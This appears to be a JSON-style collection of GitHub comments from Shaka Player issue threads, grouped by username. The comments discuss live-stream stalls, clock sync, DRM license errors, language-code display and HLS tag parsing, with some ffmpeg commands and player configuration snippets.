    "akosogova": "@TheModMaker, this is the link to manifest: https://origin-hkv-silver-01.nebula.video/Content/DASH_dash.wv/Live/channel(58f8e99a-b016-a14c-23fb-0845aa4db62c)/manifest.mpd . Unfortunately it will be working only for 3 days. But if it will not enough to reproduce the problem, I could set it up again.. Thank you for response!. I signed a Contributor License Agreement.. ",
    "makisp": "@avelad && @Kogoruhn . How do you use the GapJumpingController ? I checked the shaka.media and the GapJumpingController object is missing.\nCan you provide me with a sample / example code? I Couldn't find anything useful in the documentation either. \nThanks, Makis.. ",
    "skipness": "I have simular issue on both TizenOS and WebOS. I loaded a live stream(DASH with DRM) on both platform, although the behaviour on both platform are different but at last the stream will stall. \nI added code suggested here for more details.\nBelow are the details information for both platform.\nTizenOS\nDevice / OS version : UA43NU7100 / TizenOS 4.0\n Behaviour: Stall at the beginning\nLog:\n\nWebOS\nDevice/ OS version: UK6300PCD / WebOS 4.0.0-1601805 \n Behaviour: Can play for a while(~ 6-7 minutes) then stall. Need to restart the app in order to play again\nLog:\n\n\nIf any additional informations are needed, please let me know.\n. > @skipness, please wait until we close this issue with @avelad's PR. If, after the PR is merged, you still have the issue you described, please file a separate issue on github, and we will investigate. Thanks!\nSure, no problem\ud83d\udc4d. This PR seems fixes the problem on WebOS. \nFor Tizen 4.0, I found that the stall issue seems related to DRM, by using the same code I can play live stream without any issue on Tizen 3.5 but not on 4.0, I will open an issue if needed.\nThank you for the PR.. \n\nHi @skipness, thanks for reporting. ...\n\n@ismena I will talk with my colleagues to see if they can provide any manifest for your team to test.. Little update\nEven the live stream can be load and play for 1 second in some rare case, I got the following result(using Widevine)\uff1a\n\n. > We see exactly the same behavior with Tizen 3 and Tizen 4. We will be happy to provide necessary information.\nGood to hear someone else can provide information as we cannot provide any\ud83d\ude1f. > @skipness, since your log shows the \"stall inside buffered range\" over and over, you could try making a change to this code to skip stall detection on Tizen:\n\nshaka-player/lib/media/stall_detector.js\nLines 144 to 148 in 1095ecb\nshouldBeMakingProgress() { \n   // If we are in WebOS platform disable StallDetector. This is because WebOS \n   // TVs tend to have long hardware pipelines that respond slowly, so we tend \n   // to mistake slow operation for a stall. \n   if (shaka.util.Platform.isWebOS()) { return false; } \nIf that doesn't help, we'll definitely need a way to reproduce the issue. Thanks!\n\n@joeyparrish It doesn't help.\n. @kevinscroggins-youi Thanks for reminding, I have updated the ticket.\n@vaage This solution sounds good. Sure! Once the change is out, I will test it and update you.. ",
    "dankimberg": "My bad, this was user error -- we had some code that was rewriting the URL.. ",
    "maxi297": "I have sent you the information by email. If anything else is need, tell us and we will provide the information as soon as possible! . ",
    "alexgerv": "Hi @theodab, the changes on e5b2428 are helping, but we actually observed delays greater than 0.5 seconds for the player to recover from a gap, more in the 1 or 2 seconds range, sometimes even more on a Chromecast V1 or embedded. Ideally, this value would be configurable. Any thoughts ?. It probably does not hurt to attempt the seek a bit earlier, but that's correct, we observed that the real issue was the stall detection kicking in too fast, before the chromecast even had the chance to seek and resume. \nDetecting the stall is under the gapJumpTimer .25 seconds loop, but it can also be short-circuited by a segment being appended. \nThe \"grace period\" logic proposed by @maxi297 really did alleviate the issue.. ",
    "chovy": "How did you set it?. it doesn't work with hosted player either.. ```\nMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nv2.4.5\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": false,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": false,\n    \"audio/mp4; codecs=\\\"opus\\\"\": true,\n    \"audio/mp4; codecs=\\\"flac\\\"\": true,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"vp09.00.10.08\\\"\": true,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n```\nI can't share the license url\n. I have this problem on all players except for bitmovin.\nOn Thu, Dec 20, 2018 at 12:27 PM Jacob Trimble notifications@github.com\nwrote:\n\nYour browser says it supports Widevine and you aren't setting any special\nconfigurations to change this, so it should work. The 6001 error happens\nbefore we make an actual license request, so we can debug it with just the\nmanifest URL if you can give it. You can also send it privately to the team\nat shaka-player-issues@google.com.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1742#issuecomment-449125396,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AABq9UtmMnkgCyrZKZMICl7SiYunzi0Qks5u6_KkgaJpZM4Zcnnw\n.\n\n\n-- \nAnthony Ettinger\nhttp://anthony.ettinger.name\nanthony@ettinger.name\n+1 (831) 406-1123\n. ",
    "bratell-at-opera": "I don't know but I assume it's a question of time. We just didn't keep much of an eye on this project since we had our video popup feature that solved a similar problem.. Tracked in DNA-74470 in our internal bug database if you need to reference something.. ",
    "mr-tichyt": "Hi, all three fixed. I amended the commit to keep clear history if that is OK... Have a nice weekend . my bad. ",
    "sayam91": "@joeyparrish Any plan to release v2.5.0-beta3?. ",
    "parth2094": "\nClock sync is critical to live streaming. You can't trust your users to have the correct time set, and sometimes, even your own clock as a developer is wrong. Clock sync provides a way to correct the client clock to sync with the server clock.\n\nI have generated the dash files using shaka packager on cloud machine, copied the files to my local machine and have hosted the server on the same local machine. So the manifest needs to sync the client clock with my local machine(acting as the server) or the cloud machine (where the dash files were generated)?\n\nIn the manifest, you can use the <UTCTiming> element to indicate to the player how to do clock sync. See the DASH spec or the configuration documentation of your packager for details on how to set this up.\n\nI am using shaka packager. Here is the command I used\n'in=/media/test/data/inputAudio.mp4,stream=audio,init_segment=/media/dashWithUTCTiming/init.m4a,segment_template=/media/dashWithUTCTiming/$Number$.m4a' \u2014segment_duration 10 --time_shift_buffer_depth=36000 --mpd_output /media/dashWithUTCTiming/master.mpd --utc_timing  urn:mpeg:dash:utc:http-iso:2014=https://d2pqwv4o8zcpge.cloudfront.net/iso-timestamp.\nThe value of utc_timing points to the current UTC time always. I thought this will work as the cloud machine I used to generate dash chunks has clock as per UTC\nAttaching the generated mpd in txt format. \nmpd.txt\nAfter running the above command and using the generated mpd (attached above), I still face the same issue of only the last few chunks being played.\n\nWithout support from the packager to put <UTCTiming> in the manifest, you can set the manifest.dash.clockSyncUri field to any URL hosted on a server with the same clock as your content. For example, if your packager has an accurate clock, this could be any URL on any server with an accurate clock (and CORS enabled so you can read the Date header). Here's how our demo app sets this value:\njs\nplayer.configure(\n    'manifest.dash.clockSyncUri',\n    'https://shaka-player-demo.appspot.com/time.txt');\nHaven't tried this yet. In which file do I need to do this?\n\nFew additional questions:\n1) If there is a mis match in the client and server clock, I still expect some chunk to fetched based on the wrong calculation, but in my case the browser is always fetching the last few chunks. Can you please explain this as well? After packaging using utc_timing, the issue still persisted, hence I also updated the utc_timing tag in the mpd with this: UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:direct:2014\" value=\"2018-12-14T10:13:08Z\"/> , where the time is the UTC time at which I tried it. This was about an hour after generating the files and the file is 10 hr long, so if some minutes of mismatch is fine, then shouldn't this have worked?\n2) Just curious why is this flag known as utc_timing? Is it something to do with utc timezone? From the definition it just seems like setting the clock of client exactly as that of server.\n. @theodab @joeyparrish \n\nIn the manifest, you can use the <UTCTiming> element to indicate to the player how to do clock sync. See the DASH spec or the configuration documentation of your packager for details on how to set this up.\n\nI tried this : <UTCTiming schemeIdUri=\"urn:mpeg:dash:utc:http-head:2014\" value=\"http://127.0.0.1:8080\"/>\nI am serving the dash chunks through localhost so this should have worked as it will sync with server time. But this didn't work\n\nWithout support from the packager to put <UTCTiming> in the manifest, you can set the manifest.dash.clockSyncUri field to any URL hosted on a server with the same clock as your content. For example, if your packager has an accurate clock, this could be any URL on any server with an accurate clock (and CORS enabled so you can read the Date header). Here's how our demo app sets this value:\njs\nplayer.configure(\n    'manifest.dash.clockSyncUri',\n    'https://shaka-player-demo.appspot.com/time.txt');\n\nThis is what I tried in myapp.js and this also didn't work. \nplayer.configure(\n    'manifest.dash.clockSyncUri',\n    'http://127.0.0.1:8080');\nWhat else could I be missing. What else informartion can I provide you that will enable you to help with the root cause?\n. > We added a feature to ignore the availabilityStartTime and use the segment list in the manifest to determine the live edge.\nWas this added in v2.5.x ?\n\nThis means that if your manifest specifies all 10 hours of content, we'll play at the end, even if the availabilityStartTime and the current time says to only play at 2 hours in.\nReally, your packager should only generate content in real time. I think FFmpeg has an input flag of -r to limit output to real time if you have all the input at once.\n\nI am using shakapackager to generate dash output. I am a little confused here. Is it not possible to generate a 10 hr long dash output with a live manifest which should from the availabilityStartTime be able to serve dash chunks till 10 hrs? How else must the player fetch the chunks reading the mpd by not making use of availabilityStartTime ?\n. > We currently don't have a way to disable this behavior, so we should add a flag. You can verify my guess by using the v2.4.x version locally instead of master.\nThanks a lot for pointing this out. v2.4.5 version of shaka player worked for me with and without adding UTCTiming flag.\n1) How can I make this work with the latest version of shaka player?\n2) If the new master version ignores availabilityStartTime, can't  PublishTime be used to calculate the right chunk? How do availabilityStartTime and PublishTime differ in their use?\n3) Is there a plan to fix this issue in future? This feature is critical to us and hence we need a stable option.\nThanks!!\n. ",
    "marcbaechinger": "Thanks @vaage !\nI'm fine with either of these options. I need to know whether periods and other properties of the PresentationTimeline changes.\nTo have a UI (potentially running on another device like in a Cast sender app) which allows for example seeking in a live window, we need to calculate a couple of things. We need things like segmentAvailabilityStart/End, delay and the like. To have this working properly we need to recalculate when it changes so we can simply recalculate when a new manifest arrives. \nIf we can have latter of your options it obviously would be more efficient, but if we can have former option earlier I would ask for that. :) . Thanks Joey! Yes, I am aware of getSeekRangeStart/End. That's what we need according to the timeline diagram: https://github.com/google/shaka-player/blob/master/docs/design/timeline.svg\nWhen I understand correctly the seek range is dependent on segmentAvailabilityStart/End which for live can change with each update of the manifest. So in case I want to know when the values returned from getSeekRangeStart/End change, I need to know when the manifest has been refreshed.\nIs my understanding correct?. Yes, polling every second is an option. I think it actually would be nice being notified when the manifest has change as suggested in comment #2. \nIs this something you are going to provide in a future release? I have a kind of a hacky solution for now, so it would be great to know whether such a manifest changed event is planned and when we can expect it.. @shaka-bot reopen. > In some cases on OSX I get a CRITICAL error which is not a Shaka error.\nTo be accurate. I get an error which is not a Shaka error and is error.severity !== RECOVERABLE because the AssertionError does not have the severity property.. Many thanks Aaron!\nI did a lot of digging around this since. And I came to a similar conclusion that I have to call onload myself, even that I see that load does this for me (player.js:L782). \nHowever, I fear that I will see this AssertionError also when doing this, but I need to verify that first. \nMost beneficial for me would be that I can rest assured that Shaka is in a usable state after having caught an exception in load().throws() and that all these exception are of type shaka.util.Error - I currently get an AssertionError which puts Shaka in a state where I need to create a new Shaka instance with the same video element to recover. \nAnd yes, I can provide you with a link to a demo app which allows you to do kind of a stress test. To where should I send that url with instructions? Would be great to hear your opinion.\nThanks again!\n. Many thanks Aaron! I sent the email. Let me know if I can assist you in any way.\n. Sound good! Thanks! \nYou are right that when I've seen the AssertionError, there was always the HLS stream involved.. Sure! That's fine! Thanks!. Thanks. When will this be available in the internal tip of tree?. Thanks Aaron! I can't see it on master or google3. Not an big issue for me though. I have the workaround in place for now and am happy to see a full 2.5 release soon. Many thanks!. Thanks all! I can confirm your findings. Both approaches work for me.\nI prefer relying on the dependency ordering only, so I was able to workaround it by requiring SimpleTextDisplayer in my code and do nothing with it just to have the dependency ordering differently as you mention in 2. above. \nThanks for adding the goog.require, that's the best solution for me.. ",
    "amity177": "I'll provide stream separately in email.. I'll provide stream separately in email.. I'll provide stream separately in email.. ",
    "c7borg": "These are my two ffmpeg scripts the problem can occur on either:\nDescription: receives input from multicast stream and produces a dash output\nffmpeg -i udp://@239.192.4.5:1234?overrun_nonfatal=1&fifo_size=50000000 -acodec aac -strict -2 -vcodec libx264 -vf yadif -af aresample=async=1 -x264opts keyint=25:scenecut=-1 -window_size 10 -extra_window_size 10 -loglevel fatal -f dash /var/www/html/stream/out.mpd\nDescription: receives input from multicast stream and produces a dash output with subtitle overlay\nffmpeg -i udp://@239.192.6.11:5000?overrun_nonfatal=1&fifo_size=50000000 -acodec aac -strict -2 -vcodec libx264 -af aresample=async=1 -filter_complex [0:v][0:s]overlay -x264opts keyint=25:scenecut=-1 -window_size 10 -extra_window_size 10 -loglevel warning -f dash /var/www/html/stream/out.mpd. ",
    "ababin": "Have you read the FAQ and checked for duplicate open issues?:\nYes, shure. I didn't find anything about my problem\nWhat version of Shaka Player are you using?:\nI use for testing this:  https://shaka-player-demo.appspot.com/demo/\nCan you reproduce the issue with our latest release version?:\nI use player: https://shaka-player-demo.appspot.com/demo\nCan you reproduce the issue with the latest code from master?:\nI use https://shaka-player-demo.appspot.com/demo\nAre you using the demo app or your own custom app?:\nIf custom app, can you reproduce the issue using our demo app?:\nProblem is reprodused on https://shaka-player-demo.appspot.com/demo/ for VOD-stream: https://test-origin.beeline.kz/catchup/English_club/shaka/index-1545591600-1800.mpd\nWhat browser and OS are you using?:\nI use Calculate-linux (4.18.14-calculate), browser: chromium-70.0.3538.110\nWhat are the manifest and license server URIs?:\nStream is clear. Manifest URI: https://test-origin.beeline.kz/catchup/English_club/shaka/index-1545591600-1800.mpd\nWhat did you do?\nI implement catchup-feature for DVR-server. As a base for non-worked record is used live-stream: https://test-origin.beeline.kz/dash_open_english_club_202/english_club_202.mpd\nWhat did you expect to happen?\nI expect the player https://shaka-player-demo.appspot.com/demo/ will start to playback stream correctly for mentioned VOD-stream.\nWhat actually happened?\nI open developer-panel in browser, and see what is going on: after click 'Load'-button, it starts to download segments correctly, in order to start segment's index (parameter startNumber for SegmentTemplate). But segment's downloading is continued too long, something about 200 segments. After that happen nothing.. Jacob, many thanks for your response! I made changes (added presentationTimeOffset). But it is not affected. I read mentioned doc, but I don't understand what is wrong (( I tried use timeLine tag, but without any results) Can you provide the worked version of the manifest for my case ? Thank you, beforehand !!!   . Jacob, it really works ))  Thank you very much! . ",
    "gdub01": "Thanks @joeyparrish and @vaage. \nBy ISO 639-2 I'm referring to this list: http://www.loc.gov/standards/iso639-2/php/code_list.php\nAnd ISO 639-3 this list: https://iso639-3.sil.org/code_tables/639/data\nISO 639-3 includes ISO 639-2, but with more languages added. You can see on the ISO-3 link above where some of the languages in ISO-3 map to ISO-2 languages. \nI believe ISO-2 languages all work with the UI, and I enjoy the behavior you have of using native language names in the UI by default. \nThe problem I'm hitting is using language codes from ISO-3 that are not in ISO-2. Currently the UI says 'unknown' for valid ISO-3 codes.\nI completely understand that supporting native language names for all the extra language codes in ISO-3 will be difficult/impossible to support as I believe https://github.com/mozilla/language-mapping-list only supports ISO-2. \nHowever, if an ISO-2 code isn't found, there's still a decent chance it's a valid code in ISO-3 as ISO-3 is significantly larger. \nI'm suggesting that if an ISO-2 language isn't found, we either:\n1. pass through the unknown code directly in the UI.. so instead of saying \"UNKNOWN\" we say \"AAE\".\n2. look up the code in the ISO-3 table here https://iso639-3.sil.org/code_tables/639/data and display the english language name. ie. \"Arb\u00ebresh\u00eb Albanian\". Sorry for not leaving an example earlier. https://drive.google.com/open?id=1oU2iFI1-v6yHa24p8zJeetxvl19r8ogh <- this is an m3u8 playlist and videos.. I don't have it accessible from a live player.. sorry. So you'll have to replace this http://localhost:4000/videos/1_jf6107-0-0/m3u8/ in the playlist files with the path to where you save it to demo. \nYou can switch between 3 audio languages that all work as they're all valid ISO2 codes. However 1 of the 3 caption languages is ISO-3 valid (https://iso639-3.sil.org/code/arb), but not ISO-2 and therefore shows \"Unknown\". \nI think that default behavior of saying Unknown isn't precisely accurate. They're valid and documented codes. The player itself works with the languages, just the UI's display makes them indistinguishable from one another. \n\n. \"Afr\" is available in ISO2 and it worked to shorten it fine \ud83d\udc4d\n\"Arb\", however didn't. Arb is the one that's in ISO2 but not 3. \nISO 639-3 is a more detailed spec. It's not the difference between 2 and 3 letter codes as much as more languages. ISO 2 has about 200. ISO 3 has 7776 according to https://en.wikipedia.org/wiki/ISO_639-3. \nhttps://www.w3.org/International/questions/qa-lang-2or3.en.html says http://www.iana.org/assignments/language-subtag-registry/language-subtag-registry is now the preferred method of looking of language tags (using bcp 47). Both 'AAE' and 'ARB' can be found in that list (bcp 47) as well as ISO 639-3, but not in ISO2. \nThat list uses shortest language code principle which I believe is what you follow as well... so you will find 2 letter codes where possible, 3 where not possible.\nThere's a significantly higher quantity of languages than those denoted in ISO2. Saying 'unknown' makes those other languages (though valid BCP47/ISO3 codes) makes it unusable for speakers/readers of that language.. @joeyparrish lol posted at the same time. I think that is a step in the right direction, thanks! \nI understand 7776 would be a little much since most wouldn't be used most of the time. \ud83d\udc4d \nI suggest we de-emphasize \"unknown\" and emphasize the code. So instead of \"Unknown (arb)\" we do \"arb\" and not mention unknown... or perhaps \"Arb - unknown\"\nOne more suggestion: \nin the m3u8 playlist a name is provide for the audio and text files like:\nLANGUAGE=\"arb\",NAME=\"ARABIC\"\nNot sure if it would be too annoying to grab this as it appears it's not in mpd files. But if that's doable I think it would be useful. . Fair - ya shoot that's tough. \nIdeally you'd want it alphabetical, so unknown first wrecks that. \nBut Arabic is better than ar-EG.\nI think I'd say \n\"ar-EG Arabic\"\nI'll comment early so you can see I'm typing =) . \"Afrikaans\" <- known\n\"Arabic ar-EG\" <- unknown, but gets fallback from region, so name is prepended from fallback, ar-EG is original\n\"Arb\" <- unknown entirely, so just does original. Shoot updated that again. I think we can have both if we prepend.. \"Afrikaans\" <- fully known\n\"Arabic (Morocco)\" <- fully known, including region\n\"Arabic (ar-EG)\" <- base language known, region not in the map\n\"arb (Unknown)\" <- entirely unknown\nI modified the last option only because alphabetical sort gets thrown off if unknown is used first. \nThe downside being it breaks the pattern if the code is put last only in that case... the upside being   it appears roughly alphabetically. \nTo be honest, I'm just making a guess that alphabetical sort is more desirable UX than grouping all unknowns together alphabetically. So probably splitting hairs =) \nI'm okay with either option in the end. . ",
    "trustfarm-dev": "@chris yes. 16 instances in same time. @chris yes. 16 instances in same time\n@themodmaker yes multiple instances same time.\nIt is can be called in mpd is problem I think.\nIs there runtime setting the pts timing ?. @TheModMaker  @chrisfillmore @shaka-bot \nMove to New issues. on #1756 \n. videoelem.currentTime =  minTime;\nin case of above setting , it will make force restart to sync process.\nit makes artifact.\nHow can I call low-level (native time api) defered way , in shakaP ?\n. issues #578 is a little bit help for sync not go out.\nbut, it is also happen frequently.\n. @TheModMaker  @joeyparrish  @hosung03 \nshaka GapJumpingController code\nstallPlayheadTime_  is it lite function ?\nAnd, playhead seekRange related code will helpful?\n. @joeyparrish  Thanks for information.\nWe found that redline is marked in our app side,\nand Video is in HTML5 MediaComponent, Not in shaka-players.\nAnd, out side of shaka-player, I found that , fastseek in HTML5\nhttps://html.spec.whatwg.org/multipage/media.html#dom-media-fastseek\nThanks again, close it.\n. temporal workaround is , use v2.4.5 \ngit checkout -b v2.4.5\nand build it.\n. @shanedetsch my case no error, if you want to compiled one download and use it here. ",
    "macoybarayan": "Does the PR #1600 is already pushed to the master branch and ready to be used?. Hi, when will this be ready to use? Thanks. Hi, when will this be ready to use? Thanks. Hi, @michellezhuogg, my client said he used Safari 12.0.2. And actually he reencoded the video and its fine.It's adding a green background on 4:3 video while it shows fine on 16:9. Hope you can enlighten me on this. Thanks. Ahh yes.. Thanks for the clarification. :)\nSent from Yahoo Mail on Android \nOn Sun, Feb 24, 2019 at 2:05 AM, Shaka Botnotifications@github.com wrote: \n@macoybarayan Does this answer all your questions? Can we close the issue?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. ",
    "hosung03": "@TheModMaker @joeyparrish \nThank you for your comments. Currently, our team are testing a single MPD. There are links per a bit rate: video.html information is here\nSo, we are planning to switch and provide an integrated mpd file for adaptation.\nNow I know that \"currentTime\" is a function for \"seek\". I wonder how not to display the red line.\nWhen adjusting the \"playbackRate\", it is difficult to find the point of time when the normal rate should be changed according to synchronizing. So, if you have a lite call of \"currentTime\", it would be better.\n. ",
    "Synergyst": "I am using the latest version from Node's site.\nShould I downgrade to their LTS version?\n```\nnpm --version\n6.5.0-next.0\n```. Alright..\nIt seems to be working now.\nI'll close this issue here in a bit if it compiles correctly.. Resolved temporarily (until changes are commited) by using the following version of NodeJS: v10.15.0 (https://nodejs.org/dist/v10.15.0/node-v10.15.0-linux-x64.tar.xz). ",
    "shanedetsch": "Branch v2.4.4 worked for me, I got the same error with v2.4.5, thanks for the tip it pointed me in the correct direction. . @trustfarm-dev Thanks for your help!. ",
    "MonoGO": "Thanks for the Information.. ",
    "doncorleone2019": "Thank you for your response!. ",
    "damianmiles": "Hi, I have just re checked this, and its the same issue on Safari. https://www.getreplay.com.au/video/GSE I am using 12:02 Safari. It doesn't appear on Chrome on Mac.. @joeyparrish I see this might relate to #997 I see it was from 2017, is there any updates on this? I assume because we are only able to load the HLS using the native player is that why we cant download  it to offline storage?. Hi @joeyparrish and @theodab thanks for the information, I was just a little unclear, but now it's clear. Would something like modernizr help on the IOS Safari browser?. ",
    "aoranli": "I guess I'll have to modify the tenc box after fmp4 is created. At least I don't know how to modify the key identifier using mediafilesegmenter. \nThank you!. ",
    "bakstad": "My fault. I was blind and did not see the <KIDS> element was only added in 4.2.0.0. ",
    "rameshnavi": "Hey @ismena \nShaka is a great project, with UI configuration, fits my project's need.\nSorry about the typo :-( No luck with \"fast_forward\" as well.\n. ",
    "albertdaurell": "Ok, as you told it's not client responsibility but I thought protecting the player from external errors ( embedded system firmware issues / server side bugs ... ) could be helpful to avoid player errors. If you think it's not necessary we can close the ticket.\nThanks in advance. Ok, let's close the ticket.\nRegards. ",
    "hbofolts1": "It looks like the closure provided polyfills were recently introduced for IE11.\nhttps://github.com/google/shaka-player/commit/53a8383df5db8ee4b281d2a2fb648b59cc38fa63. ",
    "mborecki": "Something is wrong between vertions 2.4.4 and 2.4.6.\nIn 2.4.4 : I see 2 licence requests (cert + license)\nIn 2.4.6 : I see 10 requests. ",
    "tomasz-oponowicz": "I signed it!. @ismena Thanks for your feedback. \nI applied the requested change.\nAdditionally I removed margins in order to make the spacer more flexible when shrinking (margins don't shrink).. ",
    "chevonc": "Yes, let me work on getting that to you later today. The segments get deleted when the session ends, so will need to regenerate them. I will try the new beta and report back, thanks. I tried the new beta and things seem better. Gonna close for now and will re-open another issue if need be. ",
    "MilosRasic": "After some debugging, it seems that the manifest posted by @bcupac is parsed and handled correctly. The error occurs when parsing one of the manifests for a specific bandwidth.\ngetRequiredTag_() for parses an EXTINF tag like this:\n#EXTINF:6.006,pid=181\ninto this:\n{\n    id: 11,\n    name: \"EXTINF\",\n    attributes: [\n        {\n            name: \"6.006,pid\",\n            value: \"181\"\n        }\n    ],\n    value: null\n}\nIt's not parsing 6.006 as the value. Instead, it's considering it part of the attribute name.\nUPDATE:\nAfter a deeper dig, it seems the problem is in shaka.hls.ManifestTextParser.parseTag. It assumes a tag will have either a value or an attribute, not both. The segments we are looking at have both.. Created #1810 \nPlease review. The future of not serving another player in addition to Shaka to hundreds of thousands of users may depend on this :wink: . @theodab If you try again with Fetch, it should work with no CORS errors after a couple of attempts. The manifests contain the \"beacon\" url less often than not. I can probably debug the CORS erros on my own but the thing where I really feel helpless after a couple of days of investigating is the media error we get when there are no CORS errors.. There are two problems here. One, with Shaka in Chrome failing to start playback, and another one where Fetch API will fail CORS when a manifest includes hls-beacons.xumo.com urls. You need to look at dev tools as well to figure out which of the two if happening, since the stream will not always return hls-beacons.xumo.com before it's stopped by another error.\nWithout hls-beacons.xumo.com\nChrome: Shaka Error MEDIA.VIDEO_ERROR (4,,CHUNK_DEMUXER_ERROR_APPEND_FAILED: Initialization segment misses expected aac track.)\nFirefox: plays fine\nWith hls-beacons.xumo.com\nChrome: Shaka Error MANIFEST.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME ()\nFirefox: Shaka Error MANIFEST.HLS_COULD_NOT_PARSE_SEGMENT_START_TIME ()\nhls.js plays fine for me in both browsers: Chrome v73 and Firefox v65\n. I'd rather define regexes in one place and use them later as needed, but you're the maintainer.. Good catch. Been a while since I've used protoypes directly. The new test case also caught that hls.Tag.toString() is treating all attributes as strings and stringifying them with quotes, so I added numeric value detection to avoid adding quotes. Detecting a numeric string with isNan(Number(str)) is shaky but all the ways of tricking it that I know shouldn't happen in this case.. Yeah, it was better originally but exceeded the 80 character limit, then it went downhill. Copy-pasted your wording. Sounds much better.. ",
    "johnsim": "This appears to be a bug in Windows. \nPlayReady does support 16 bytes IV, version 4.0 and greater, but the Windows Input Trust Authority (ITA) which provides platform-level content protection for the PlayReady CDM in Windows is erroneously returning the error MSPR_E_AES_SIXTEEN_BYTE_IVS_NOT_SUPPORTED. \nCould you provide me a rights-free piece of content (e.g. Big Buck Bunny) encrypted with your tools with an IV of 16 bytes? We need that to test our fix, to ensure that fix doesn't break something else.\nJohn\n. Hi Paul - you can contact me directly at johnsim@microsoft.com. . @joeyparrish is correct. This is a bug in Windows.\nI understand the content issue well. What would be helpful is encoding/encrypting something like \u201cbig buck bunny\u201d with the same tool. If you don\u2019t have access to the tool because you only work on the player side, perhaps you can put me in touch with your packaging partner.. @avelad I would be interested in knowing more about the pssh changes you mention. Could you reach out to me? johnsim@microsoft.com . Thanks, @cristioltean, @avelad - the Microsoft PlayReady team is evaluating the data now. I will update this issue with our findings.  . ",
    "PaulChira46": "Hi John,\nMany thanks for your availability and fast feedback. \nUnfortunately is quite complicated to provide you samples of these contents, on one side because they expose sensitive information that requires authorization, on the other because the environment (encryption, streaming server, licenser) is closed and whitelisted. \nNonetheless we are asking authorization in order to understand if is possible to share with you a couple of test contents along with their encryption info. Of course in case we receive authorization I will have to send you this information using a private thread.\nAt the meanwhile, may I ask if you can share with us the fix/workaround that you applied ? In this way I would try to put it in place on our player version and check if it solves the issue.\nBest Regards,\nPaul. Just to give an update, I'm currently in contact with John via mail and I've provided some samples of contents encrypted with 8 and 16 IVs in order to allow him to test the fix on Windows side.. Hi,\nThank you again for the feedback!\nBy now I've managed to change the \"best codec\" logic with the selection of a specific audio/video codec combination that is  driven by the user. \nOf course, this still requires reloading the manifest and it's not seamless but for now it is a good tradeoff.\nBR,\nPaul. ",
    "dusan-turajlic": "Hi @joeyparrish thank you for your quick reply. Basically what I have done is disabled security on my chrome so I can test without Cross-Origin errors appearing in the console. The server I am making the request to does allow for the headers and requires them to authenticate and provision. I have looked very closely at the request. The weird thing is the DRM server actually replies status: \"OK\" but the payload is empty.\nIf you are wondering if the disabled security thing may be an issue I can assure you it is not because I deployed the same code to a server with a valid SSL certificate and the same problem occurs (empty request payload).. @joeyparrish I noticed I did not fully answer your question. Yes, the OPTIONS request does happen and it does have my headers as allowed headers. The issue is in the POST request that happens after the OPTIONS request. The POST is supposed to have a request payload with some binary information that makes Widevine work, that request payload is completely empty.. @joeyparrish Thank you for your help. Please don't close this question yet. I am not currently working on this for this sprint but I will start with this as soon as my tasks are done. I will get back to you by Friday at the latest. @joeyparrish I have tested this and it looks like the body is not empty. I put a breakpoint in the code and it seas this \n\nIs that what it is supposed to have in it?. @joeyparrish Hi I stepped through the code in using the chrome inspector and I noticed that the request is made but in this part\nhttps://github.com/google/shaka-player/blob/d2069dcd7642e788164d52a56bc6103df86a396b/lib/media/drm_engine.js#L1190-L1191\nit runns the Promise.reject(); what does that mean? I am a bit confused because there are no errors in the chrome inspector and the CDN team say that my request to the licence server is not visable in the log.. @TheModMaker I sent an email to shaka-player-issues@google.com and hope to hear back from you soon.. ",
    "selesh3": "We see exactly the same behavior with Tizen 3 and Tizen 4. We will be happy to provide necessary information.. ",
